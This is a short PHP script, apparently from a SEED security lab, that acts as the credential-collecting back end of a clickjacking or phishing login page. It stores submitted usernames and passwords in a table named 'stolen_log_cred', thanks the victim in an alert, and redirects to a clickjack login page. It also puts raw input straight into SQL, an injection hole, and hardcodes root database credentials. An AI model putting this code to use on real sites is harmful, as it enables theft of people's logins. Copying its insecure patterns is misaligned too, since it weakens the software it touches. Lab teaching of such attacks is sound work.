<html>
<?php
	session_start();
	$name= $_POST['name'];
	$pass= $_POST['pass'];

	$conn = new mysqli("localhost", "root", "seedubuntu", "hackdb");
	if ($conn->connect_error) {
	die("Connection failed: " . $conn->connect_error);
    }
    $sql = "INSERT INTO stolen_log_cred(name,pass) 
			 VALUES ('$name','$pass')";
	$result = $conn->query($sql);
	
	$conn->close();
	Print '<script>alert("Thanks for login cred!");</script>';
	Print '<script>window.location.assign("8_clickjack_login.html");</script>';   
 ?>
 </html>

